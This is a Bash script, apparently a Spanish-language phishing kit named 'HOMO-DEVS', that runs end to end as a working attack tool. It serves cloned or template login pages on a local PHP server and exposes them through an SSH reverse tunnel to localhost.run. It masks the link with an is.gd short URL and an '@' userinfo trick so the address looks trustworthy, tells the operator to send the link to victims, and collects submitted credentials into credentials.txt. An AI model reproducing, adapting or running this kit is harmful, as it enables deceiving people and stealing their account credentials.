#!/bin/bash

RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')" END="$(printf '\033[0m\e[0m')"

ctrl_c(){
	sudo pkill php &>/dev/null
	sudo pkill xterm &>/dev/null
	if [[ -f "sites/$x/credentials.txt" && -s "sites/$x/credentials.txt" ]];then
		cat sites/$x/credentials.txt >> credentials.txt
		clear
		banner
		echo -e "[${CYAN}X${END}] ${CYAN}Credenciales capturadas:${END}"
		cat sites/$x/credentials.txt
		rm sites/$x/credentials.txt &>/dev/null
	fi
	rm link.txt
	exit 1
} 2>/dev/null

trap ctrl_c INT

banner() {
	cat <<- EOF
	
${MAGENTA}██╗  ██╗ ██████╗ ███╗   ███╗ ██████╗       ██████╗ ███████╗██╗   ██╗███████╗
${MAGENTA}██║  ██║██╔═══██╗████╗ ████║██╔═══██╗      ██╔══██╗██╔════╝██║   ██║██╔════╝
${MAGENTA}███████║██║   ██║██╔████╔██║██║   ██║█████╗██║  ██║█████╗  ██║   ██║███████╗
${MAGENTA}██╔══██║██║   ██║██║╚██╔╝██║██║   ██║╚════╝██║  ██║██╔══╝  ██║   ██║╚════██║
${MAGENTA}██║  ██║╚██████╔╝██║ ╚═╝ ██║╚██████╔╝      ██████╔╝███████╗╚██████╔╝███████║
${MAGENTA}╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝ ╚═════╝       ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝ ${RED}1.0
                            ${CYAN}By: Alcatraz2033
                ${GREEN}Github: https://github.com/Alcatraz2033${END}
                
	EOF
}

demon(){
	cat <<- EOF
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢩⢑⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⢱⣕⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⢘⣯⣘⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠘⣾⣟⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⢀⡸⣿⣭⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠆⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⡶⣿⡍⣼⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⡇⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⠀⣺⣿⣟⢰⣇⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⡇⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⢤⣤⣶⣶⣿⣿⣷⣶⠏⠀⠨⣽⣿⣧⡟⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣯⠟⠀⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⢴⢾⣞⣽⣿⣾⣿⣿⣿⡿⠃⠀⠉⣲⣿⣿⣵⣵⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⢄⠀⢢⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⣾⣿⡷⣫⣶⣟⣯⣙⣛⣿⣿⣿⠟⠀⢀⠀⢠⣷⣿⣿⢇⣾⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⢿⣷⣣⡀⠑⢄⠀⠀⠀⣠⡴⢟⣵⣿⣿⢟⣼⣿⣿⣶⣾⣿⣭⣭⣛⠿⢄⣀⣷⣮⣾⣿⠏⢎⣾⣿⣿⣯⡷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡘⠻⣾⡃⡀⠀⠑⣢⡾⢋⣴⣿⣿⣿⣟⣿⣿⣟⣿⣟⡛⠷⣾⣯⣽⡻⢷⣯⣿⣾⣿⣏⣜⣼⣿⣾⣿⣟⣵⡹⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣔⡼⣿⣿⣿⡖⣵⢟⣴⡯⣫⣿⣿⣿⣽⣟⣯⣭⣶⣶⣶⣶⣦⣬⣭⣟⣷⣮⣻⢿⣿⣮⣼⣿⣻⣿⣿⣿⢧⡐⢻⡀⢀⠎⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡮⣧⡼⣻⣿⢯⠟⣩⢞⣵⣿⣿⣿⣿⣿⣿⣿⣽⣿⡛⢿⣿⣿⣿⣾⣯⣗⠿⣷⣯⣻⣿⣷⣿⣿⣮⣻⣿⣷⣼⣧⡏⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⣜⢿⣿⣟⢪⢞⣵⣿⣿⣿⣵⣿⣿⣮⣙⠿⣿⣿⣿⣷⣧⣊⢽⣻⢿⣶⣭⣈⠙⣿⣿⣟⣷⣝⣿⣿⣿⣿⣿⢏⢔⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢹⣯⣯⣿⢫⡟⣵⢿⢿⣿⣿⣿⣿⣷⣮⡈⠙⠻⣿⣿⣷⣬⡓⢿⣿⣿⣷⣬⡻⣿⣿⣿⣿⣟⣿⠟⠁⣴⠇⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣽⡿⣳⢯⡾⡡⠋⠈⢟⣽⣿⡏⠇⠙⢿⣿⢯⣖⣭⣟⣿⣿⣦⣍⡻⢿⣯⣻⢿⣽⣿⣿⡿⠋⢠⣾⡋⠀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣯⣆⣿⣻⣯⣟⠜⠁⠀⠀⢈⢞⣿⡙⡄⠀⠀⠉⠛⠯⣞⡯⣟⣿⣾⣟⣿⣶⣭⣛⣿⣿⣽⡟⣁⡄⡾⠇⠸⢠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡌⢿⡟⡟⡇⠀⠀⠀⠀⠈⢧⠛⡼⠃⠀⠀⠀⠀⠀⠀⠉⠛⠛⠛⠿⣿⣮⣝⣻⣿⣿⡿⣸⣿⣾⣶⠀⠀⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣌⢷⡇⡇⡀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠟⠛⠛⠛⠛⠛⠇⠚⣼⡟⢯⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢧⡻⣷⣡⠀⠀⠀⠀⠀⠀⢃⠀⠀⠄⠀⡀⢀⣀⡀⠤⠀⠀⠀⠀⣀⣶⣭⣿⣵⠀⠀⠃⠑⣸⠀⡜⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣯⠉⣼⢼⢤⡀⠀⠀⢀⠁⡈⣷⣕⣄⣀⡀⠀⠠⠶⠶⣟⣪⣴⣿⣿⣿⣿⣻⠁⠀⡑⣴⠀⢟⡰⠇⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢧⢟⣀⣀⠀⣀⣬⣄⣠⣿⡿⠿⠏⣽⣿⣿⣿⣿⡿⠻⢿⣟⣿⣿⡿⠛⠃⠀⢠⣿⢾⣧⣄⣊⣸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣯⣿⢸⣿⣿⣿⡿⣿⣿⢋⣿⠁⠈⠛⡿⣿⡟⠿⠟⠉⠹⠛⠋⠀⠀⣀⣶⠯⣉⣼⣽⣿⣿⣙⣋⡧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣾⢆⠻⠉⠉⠩⠻⠿⢱⣿⣶⡄⠀⡀⡀⠉⠀⠀⠀⠀⢀⣠⣥⣴⣶⣶⢿⡟⠈⠉⡿⣧⠙⡷⣿⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡿⣜⠶⠤⢀⠀⠀⡃⣿⣿⣿⣿⡻⣟⠀⣴⢠⡞⠁⢾⡿⢸⣿⣿⣿⣾⠇⠀⣸⡇⢯⣧⠃⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡜⣏⠛⣿⣧⢲⢹⢸⣿⡇⣿⣿⠇⠀⠉⠸⠇⠀⠈⡀⢠⢿⣿⡿⠉⠀⣸⣟⣄⠪⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠹⣛⡆⠀⢿⢁⠘⠋⠙⠃⠀⠡⠀⠀⡀⠀⠐⢤⢠⠑⣇⢻⡏⢀⡐⣼⢏⠞⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢮⣣⠉⣿⢢⠢⣀⡀⣆⢀⠢⣠⠋⠠⡇⠀⠻⡦⢽⡁⠀⡿⣹⣫⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠵⡑⠞⠀⣁⢈⡇⢹⡄⢸⣦⢰⣿⣦⠀⠩⠻⠀⠀⢁⣯⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⢁⡔⠻⣾⢿⡾⣿⠛⣿⠛⣿⠀⢕⢄⣁⡀⠀⢸⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⢹⢺⡀⡸⠀⠆⠘⢌⡜⢀⠋⠂⠘⠉⡌⠉⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡇⠈⠀⠁⠀⠅⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⠀⠀⢀⠤⡂⢀⠂⣀⡀⠀⣀⣠⢄⣠⠔⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠿⣿⣶⠿⠚⠉⠛⢶⣻⠿⠟⠚⠋⠁⠀⠀⠀⠀⠀${END}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	EOF
}

cheker(){
	which php &>/dev/null
	if [ $? -ne "0" ];then
		echo -e "\n[+]${CYAN} Instalando php...${END}"
		sudo apt install php -y &>/dev/null
	fi
	which xterm &>/dev/null
	if [ $? -ne "0" ];then
		echo -e "\n[+]${CYAN} Instalando xterm...${END}"
		sudo apt install xterm -y &>/dev/null
	fi 
	which httrack &>/dev/null
	if [ $? -ne "0" ];then
		echo -e "\n[+]${CYAN} Instalando httrack...${END}"
		sudo apt install httrack -y &>/dev/null
	fi
	which xclip &>/dev/null
	if [ $? -ne "0" ];then
		echo -e "\n[+]${CYAN} Instalando xclip...${END}"
		sudo apt install xclip -y &>/dev/null
	fi 
	clear
	banner
}

process(){
	plantilla=$(cat sites/$1/site.txt)
	echo -e "\n[${CYAN}+${END}] ${CYAN}Iniciando servidor${END}"
	cd sites/$1
	sudo service apache2 stop &>/dev/null
	php -S 127.0.0.1:80 &>/dev/null &
	cd ../../
	if [ $2 == 'Port_Forwarding' ];then
		xterm -geometry 93x20-50-350 -hold -title "Servidor" -e "sudo ssh -R 80:localhost:80 localhost.run > link.txt" &
		while true;do
			if [[ -f 'link.txt' && -s 'link.txt' ]];then
				link=$(cat link.txt | grep https | head -n 1 | awk '{print $NF}')
				if [ $3 == 'Enmascarar_link' ];then
					mask $link $1
				else
					clear
					banner
					echo -e "[${CYAN}+${END}] ${CYAN}Envie este link: ${END} $link"
					echo $link | xclip -sel clip
					echo -e "[${CYAN}+${END}] ${CYAN}Link copiado en la ClipBoard${END}"				
				fi
				break
			fi
		done
		xterm -geometry 93x20-750-350 -hold -title "Credenciales" -e "watch -n1 cat sites/$1/credentials.txt" &
		while true;do
			sleep 1
		done
	else
		clear
		banner
		echo -e "[${CYAN}+${END}] ${CYAN}Link: ${END} http://127.0.0.1 o http://$(hostname -I | awk '{print $1}')"
		xterm -hold -title "Credenciales" -e "watch -n1 cat sites/$1/credentials.txt" &
		while true;do
			sleep 1
		done
	fi
}

mask(){
	echo -e "[${CYAN}+${END}] ${RED}(OPCIONAL) ${CYAN}Ingrese el complemento de la plantilla separado por '-' Ejemplo: photos-perros${END}"
	read -r -p "[${CYAN}+${END}] ${CYAN}Complemento de la plantilla:${END} " complemento 
	complemento2=$(echo $complemento | sed 's/-/%7A/g')
	curl -s --data "url=$1&shorturl=&opt=0" https://is.gd/create.php | html2text > masbien.tmp
	link=$(cat masbien.tmp | grep "\[" | head -n 1 | tr -d "\[\]" | awk -F '/' '{print $3, $4}' | tr ' ' '/')

	if [ ! $complemento ];then
		complete="$plantilla@$link"
		clear
		banner
		echo -e "[${CYAN}+${END}] ${CYAN}Envie este link: ${END} $complete"
	    echo $complete | xclip -sel clip
		echo -e "[${CYAN}+${END}] ${CYAN}Link copiado en la ClipBoard${END}"				
	    
	else
		complete="$plantilla%7A$complemento2@$link"
		clear
		banner
		echo -e "[${CYAN}+${END}] ${CYAN}Envie este link: ${END} $complete"
	    echo $complete | xclip -sel clip
		echo -e "[${CYAN}+${END}] ${CYAN}Link copiado en la ClipBoard${END}"				
	fi
	rm masbien.tmp 
}

selection(){
	PS3=">>> "
	select w in 'Clonar_web' 'Usar_plantillas';do
		if [ $w == 'Clonar_web' ];then
			select y in 'Local_Host' 'Port_Forwarding';do
				if [ $y == 'Local_Host' ];then
					clear
					banner
					cheker					
					sudo ./clone.sh $y
				else
					select z in 'Enmascarar_link' 'No_esmascarar';do
						clear
						banner
						cheker					
						sudo ./clone.sh $y $z
					done
				fi
			done	
		else
			clear
			banner
			select x in $(ls sites/);do
				select y in 'Local_Host' 'Port_Forwarding';do
					if [ $y == 'Local_Host' ];then
						process $x $y
					else
						select z in 'Enmascarar_link' 'No_esmascarar';do
							process $x $y $z
						done
					fi
				done	
			done
		fi
	done
}

if [ $(id -u) -ne "0" ];then
    echo -e "\n[!]${RED} Ejecute este script como root...${END}\n"
    exit 1
else
	cat /root/.ssh/id_rsa &>/dev/null
	if [ $? -ne 0 ];then
		ssh-keygen -t rsa -f /root/.ssh/id_rsa -q -P "" 
	fi	
	for p in {1..3};do
		clear
		demon
		sleep 0.25
		clear
		sleep 0.25
	done
	banner
	cheker
	selection
fi
